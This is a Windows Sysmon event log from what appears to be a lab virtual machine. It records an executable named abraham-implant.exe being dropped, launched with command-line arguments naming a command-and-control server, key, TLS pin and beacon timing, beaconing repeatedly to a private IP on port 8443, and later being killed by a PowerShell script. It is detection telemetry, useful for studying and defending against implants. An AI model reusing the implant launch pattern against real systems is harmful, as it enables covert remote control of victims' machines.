<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:59:26.2179437Z'/><EventRecordID>704</EventRecordID><Correlation/><Execution ProcessID='3628' ThreadID='4880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:59:26.206</Data><Data Name='ProcessGuid'>{c4fe85a1-445e-6aa3-9601-000000000b00}</Data><Data Name='ProcessId'>8632</Data><Data Name='Image'>C:\Users\antho\Desktop\abraham-implant.exe</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='CommandLine'>"C:\Users\antho\Desktop\abraham-implant.exe" "-noWait" "-server" "192.168.162.1:8443" "-key" "ae5ac1c402eb43b2ce38d61646e5e50dd3ee42ef894659734d4c1ee78d82086a" "-tls-pin" "1f07b34a2aa8cca70320df156a72334dc59dc0cf3f9e2f5e2c277a5e25f4140b" "-sleep" "3" "-jitter" "0.25" </Data><Data Name='CurrentDirectory'>C:\WINDOWS\system32\</Data><Data Name='User'>Abraham\lab</Data><Data Name='LogonGuid'>{c4fe85a1-445d-6aa3-b0e7-390000000000}</Data><Data Name='LogonId'>0x39e7b0</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=FE52297BCDDDC1E0732C4B27234AEBB8,SHA256=1005E84972237B0D323A35CE70C0CF2B6CCA0A4239BD653A26370659A85E9B05,IMPHASH=9B8C617A38FA6144D4009B423E48D71E</Data><Data Name='ParentProcessGuid'>{c4fe85a1-3c68-6aa3-4400-000000000b00}</Data><Data Name='ParentProcessId'>3324</Data><Data Name='ParentImage'>C:\Program Files\VMware\VMware Tools\vmtoolsd.exe</Data><Data Name='ParentCommandLine'>"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>2</EventID><Version>5</Version><Level>4</Level><Task>2</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:59:13.6509269Z'/><EventRecordID>703</EventRecordID><Correlation/><Execution ProcessID='3628' ThreadID='4880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>T1099</Data><Data Name='UtcTime'>2026-09-10 23:59:13.650</Data><Data Name='ProcessGuid'>{c4fe85a1-3c68-6aa3-4400-000000000b00}</Data><Data Name='ProcessId'>3324</Data><Data Name='Image'>C:\Program Files\VMware\VMware Tools\vmtoolsd.exe</Data><Data Name='TargetFilename'>C:\Users\antho\Desktop\abraham-implant.exe</Data><Data Name='CreationUtcTime'>2026-09-10 17:41:34.651</Data><Data Name='PreviousCreationUtcTime'>2026-09-10 17:41:34.651</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:59:12.3112917Z'/><EventRecordID>702</EventRecordID><Correlation/><Execution ProcessID='3628' ThreadID='4880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>EXE</Data><Data Name='UtcTime'>2026-09-10 23:59:12.310</Data><Data Name='ProcessGuid'>{c4fe85a1-3c68-6aa3-4400-000000000b00}</Data><Data Name='ProcessId'>3324</Data><Data Name='Image'>C:\Program Files\VMware\VMware Tools\vmtoolsd.exe</Data><Data Name='TargetFilename'>C:\Users\antho\Desktop\abraham-implant.exe</Data><Data Name='CreationUtcTime'>2026-09-10 17:41:34.651</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>5</EventID><Version>3</Version><Level>4</Level><Task>5</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:59:09.3947248Z'/><EventRecordID>701</EventRecordID><Correlation/><Execution ProcessID='3628' ThreadID='4880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:59:09.392</Data><Data Name='ProcessGuid'>{c4fe85a1-3e0a-6aa3-0301-000000000b00}</Data><Data Name='ProcessId'>9440</Data><Data Name='Image'>C:\Users\antho\Desktop\abraham-implant.exe</Data><Data Name='User'>Abraham\lab</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:59:09.3399228Z'/><EventRecordID>700</EventRecordID><Correlation/><Execution ProcessID='3628' ThreadID='4880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:59:09.335</Data><Data Name='ProcessGuid'>{c4fe85a1-444d-6aa3-9301-000000000b00}</Data><Data Name='ProcessId'>6300</Data><Data Name='Image'>C:\Windows\System32\taskkill.exe</Data><Data Name='FileVersion'>10.0.26100.1 (WinBuild.160101.0800)</Data><Data Name='Description'>Terminates Processes</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>taskkill.exe</Data><Data Name='CommandLine'>"C:\WINDOWS\system32\taskkill.exe" /IM abraham-implant.exe /F</Data><Data Name='CurrentDirectory'>C:\WINDOWS\system32\</Data><Data Name='User'>Abraham\lab</Data><Data Name='LogonGuid'>{c4fe85a1-444b-6aa3-c436-390000000000}</Data><Data Name='LogonId'>0x3936c4</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=CBF904BC6835B56A4BD5AC4141F8D131,SHA256=1249717315FC8F4D2DF17D5DB9DA0444795FDB9FB83DFB1F763C3F39282244F7,IMPHASH=FFE513AF7F8477FE56A2B3C63BE2D148</Data><Data Name='ParentProcessGuid'>{c4fe85a1-444b-6aa3-9001-000000000b00}</Data><Data Name='ParentProcessId'>2720</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "-NoProfile" "-ExecutionPolicy" "Bypass" "-File" "C:\Users\Public\abraham-kill.ps1" </Data><Data Name='ParentUser'>Abraham\lab</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:59:08.2374586Z'/><EventRecordID>699</EventRecordID><Correlation/><Execution ProcessID='3628' ThreadID='4880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:59:08.235</Data><Data Name='ProcessGuid'>{c4fe85a1-444b-6aa3-9001-000000000b00}</Data><Data Name='ProcessId'>2720</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='TargetFilename'>C:\Users\lab\AppData\Local\Temp\__PSScriptPolicyTest_iufb3ije.jav.ps1</Data><Data Name='CreationUtcTime'>2026-09-10 23:59:08.235</Data><Data Name='User'>Abraham\lab</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:59:07.9557985Z'/><EventRecordID>698</EventRecordID><Correlation/><Execution ProcessID='3628' ThreadID='4880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:59:07.946</Data><Data Name='ProcessGuid'>{c4fe85a1-444b-6aa3-9001-000000000b00}</Data><Data Name='ProcessId'>2720</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='FileVersion'>10.0.26100.9278 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" "-NoProfile" "-ExecutionPolicy" "Bypass" "-File" "C:\Users\Public\abraham-kill.ps1" </Data><Data Name='CurrentDirectory'>C:\WINDOWS\system32\</Data><Data Name='User'>Abraham\lab</Data><Data Name='LogonGuid'>{c4fe85a1-444b-6aa3-c436-390000000000}</Data><Data Name='LogonId'>0x3936c4</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=61F649A6FDC374A6BF36C860519E017C,SHA256=8BB6FA8C283B4D92120B1EF249A9B311B0F804D4CABBE9981159976C8BE76A5E,IMPHASH=2F87CE4617F593D7148B739BBF06D059</Data><Data Name='ParentProcessGuid'>{c4fe85a1-3c68-6aa3-4400-000000000b00}</Data><Data Name='ParentProcessId'>3324</Data><Data Name='ParentImage'>C:\Program Files\VMware\VMware Tools\vmtoolsd.exe</Data><Data Name='ParentCommandLine'>"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:59:07.5883479Z'/><EventRecordID>697</EventRecordID><Correlation/><Execution ProcessID='3628' ThreadID='4888'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>Usermode</Data><Data Name='UtcTime'>2026-09-10 23:59:05.507</Data><Data Name='ProcessGuid'>{c4fe85a1-3e0a-6aa3-0301-000000000b00}</Data><Data Name='ProcessId'>9440</Data><Data Name='Image'>C:\Users\antho\Desktop\abraham-implant.exe</Data><Data Name='User'>Abraham\lab</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>true</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>192.168.162.128</Data><Data Name='SourceHostname'>Abraham.localdomain</Data><Data Name='SourcePort'>65003</Data><Data Name='SourcePortName'>-</Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>192.168.162.1</Data><Data Name='DestinationHostname'>-</Data><Data Name='DestinationPort'>8443</Data><Data Name='DestinationPortName'>-</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:59:07.2439237Z'/><EventRecordID>696</EventRecordID><Correlation/><Execution ProcessID='3628' ThreadID='4880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:59:07.242</Data><Data Name='ProcessGuid'>{c4fe85a1-3c68-6aa3-4400-000000000b00}</Data><Data Name='ProcessId'>3324</Data><Data Name='Image'>C:\Program Files\VMware\VMware Tools\vmtoolsd.exe</Data><Data Name='TargetFilename'>C:\Users\Public\abraham-kill.ps1</Data><Data Name='CreationUtcTime'>2026-09-10 23:59:07.242</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:59:02.7476358Z'/><EventRecordID>695</EventRecordID><Correlation/><Execution ProcessID='3628' ThreadID='4888'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>Usermode</Data><Data Name='UtcTime'>2026-09-10 23:59:00.493</Data><Data Name='ProcessGuid'>{c4fe85a1-3e0a-6aa3-0301-000000000b00}</Data><Data Name='ProcessId'>9440</Data><Data Name='Image'>C:\Users\antho\Desktop\abraham-implant.exe</Data><Data Name='User'>Abraham\lab</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>true</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>192.168.162.128</Data><Data Name='SourceHostname'>Abraham.localdomain</Data><Data Name='SourcePort'>65002</Data><Data Name='SourcePortName'>-</Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>192.168.162.1</Data><Data Name='DestinationHostname'>-</Data><Data Name='DestinationPort'>8443</Data><Data Name='DestinationPortName'>-</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:58:57.6100211Z'/><EventRecordID>694</EventRecordID><Correlation/><Execution ProcessID='3628' ThreadID='4888'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>Usermode</Data><Data Name='UtcTime'>2026-09-10 23:58:55.482</Data><Data Name='ProcessGuid'>{c4fe85a1-3e0a-6aa3-0301-000000000b00}</Data><Data Name='ProcessId'>9440</Data><Data Name='Image'>C:\Users\antho\Desktop\abraham-implant.exe</Data><Data Name='User'>Abraham\lab</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>true</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>192.168.162.128</Data><Data Name='SourceHostname'>Abraham.localdomain</Data><Data Name='SourcePort'>65001</Data><Data Name='SourcePortName'>-</Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>192.168.162.1</Data><Data Name='DestinationHostname'>-</Data><Data Name='DestinationPort'>8443</Data><Data Name='DestinationPortName'>-</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:58:52.7668915Z'/><EventRecordID>693</EventRecordID><Correlation/><Execution ProcessID='3628' ThreadID='4888'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>Usermode</Data><Data Name='UtcTime'>2026-09-10 23:58:50.477</Data><Data Name='ProcessGuid'>{c4fe85a1-3e0a-6aa3-0301-000000000b00}</Data><Data Name='ProcessId'>9440</Data><Data Name='Image'>C:\Users\antho\Desktop\abraham-implant.exe</Data><Data Name='User'>Abraham\lab</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>true</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>192.168.162.128</Data><Data Name='SourceHostname'>Abraham.localdomain</Data><Data Name='SourcePort'>65000</Data><Data Name='SourcePortName'>-</Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>192.168.162.1</Data><Data Name='DestinationHostname'>-</Data><Data Name='DestinationPort'>8443</Data><Data Name='DestinationPortName'>-</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:58:01.4835455Z'/><EventRecordID>692</EventRecordID><Correlation/><Execution ProcessID='3628' ThreadID='4880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:58:01.479</Data><Data Name='ProcessGuid'>{c4fe85a1-4409-6aa3-8f01-000000000b00}</Data><Data Name='ProcessId'>5944</Data><Data Name='Image'>C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\SoftLandingTask\SoftLandingTask.exe</Data><Data Name='FileVersion'>2607.28001.0.0</Data><Data Name='Description'>-</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>SoftLandingTask.exe</Data><Data Name='CommandLine'>"C:\WINDOWS\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\SoftLandingTask\SoftLandingTask.exe" -Embedding</Data><Data Name='CurrentDirectory'>C:\WINDOWS\system32\</Data><Data Name='User'>Abraham\antho</Data><Data Name='LogonGuid'>{c4fe85a1-3c8f-6aa3-be40-090000000000}</Data><Data Name='LogonId'>0x940be</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=235D97F0DF60D31200718D19C8AC476E,SHA256=92205264CEDDAA7F2120049EB0B34B4FB732FCE80BBE93016CCE3C0422135931,IMPHASH=41FAA649D6771CE7D2A185A37249990B</Data><Data Name='ParentProcessGuid'>{00000000-0000-0000-0000-000000000000}</Data><Data Name='ParentProcessId'>544</Data><Data Name='ParentImage'>-</Data><Data Name='ParentCommandLine'>-</Data><Data Name='ParentUser'>-</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:58:01.4439892Z'/><EventRecordID>691</EventRecordID><Correlation/><Execution ProcessID='3628' ThreadID='4880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2026-09-10 23:58:01.439</Data><Data Name='ProcessGuid'>{c4fe85a1-4409-6aa3-8e01-000000000b00}</Data><Data Name='ProcessId'>5124</Data><Data Name='Image'>C:\Windows\System32\taskhostw.exe</Data><Data Name='FileVersion'>10.0.26100.8328 (WinBuild.160101.0800)</Data><Data Name='Description'>Host Process for Windows Tasks</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>taskhostw.exe</Data><Data Name='CommandLine'>taskhostw.exe CreativeId:18=128000000001615609;CourtesyOverrideRuleName:4=none;</Data><Data Name='CurrentDirectory'>C:\WINDOWS\system32\</Data><Data Name='User'>Abraham\antho</Data><Data Name='LogonGuid'>{c4fe85a1-3c8f-6aa3-be40-090000000000}</Data><Data Name='LogonId'>0x940be</Data><Data Name='TerminalSessionId'>1</Data><Data Name='IntegrityLevel'>Medium</Data><Data Name='Hashes'>MD5=9E9370331B9D14ABBA21091FFFCD1D1E,SHA256=EA8D441DF237FB3D3B7A27A95FDE186E19C94D58A618F5C29ED5FC13CB155E96,IMPHASH=2196268E7A2880E3ADC74481297D0C4B</Data><Data Name='ParentProcessGuid'>{00000000-0000-0000-0000-000000000000}</Data><Data Name='ParentProcessId'>1544</Data><Data Name='ParentImage'>-</Data><Data Name='ParentCommandLine'>-</Data><Data Name='ParentUser'>-</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2026-09-10T23:56:28.4115988Z'/><EventRecordID>690</EventRecordID><Correlation/><Execution ProcessID='3628' ThreadID='4888'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>Abraham</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>Usermode</Data><Data Name='UtcTime'>2026-09-10 23:56:27.128</Data><Data Name='ProcessGuid'>{c4fe85a1-3c9b-6aa3-a600-000000000b00}</Data><Data Name='ProcessId'>9460</Data><Data Name='Image'>C:\Users\antho\AppData\Local\Microsoft\OneDrive\OneDrive.exe</Data><Data Name='User'>Abraham\antho</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>true</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>192.168.162.128</Data><Data Name='SourceHostname'>Abraham.localdomain</Data><Data Name='SourcePort'>64995</Data><Data Name='SourcePortName'>-</Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>4.150.223.115</Data><Data Name='DestinationHostname'>-</Data><Data Name='DestinationPort'>443</Data><Data Name='DestinationPortName'>https</Data></EventData></Event>
